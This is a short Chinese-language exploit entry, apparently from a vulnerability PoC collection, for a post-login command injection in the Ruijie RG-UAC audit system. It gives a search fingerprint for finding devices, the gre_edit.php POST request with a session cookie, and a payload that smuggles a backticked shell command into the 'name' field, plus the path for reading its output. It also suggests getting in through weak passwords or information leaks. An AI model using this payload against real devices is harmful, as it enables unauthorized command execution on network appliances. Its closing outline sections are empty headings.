# 锐捷RG-UAC统一上网行为管理审计系统gre_edit后台命令执行漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="Ruijie 锐捷 RG-UAC"`
- **请求**：`POST /view/networkConfig/GRE/gre_edit.php HTTP/1.1`

**请求体 / payload**
```
使用弱口令/敏感信息泄露漏洞登录系统后台\

获取Cookie后使用下面poc
Host:
Cookie: PHPSESSID=ae63a240e1fdfb5614107040d19120f3
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
name=`pwd+>1.txt`
/view/networkConfig/GRE/1.txt
```

**其他**
- 锐捷RG-UAC统一上网行为管理审计系统gre\_edit后台命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 锐捷RG-UAC统一上网行为管理审计系统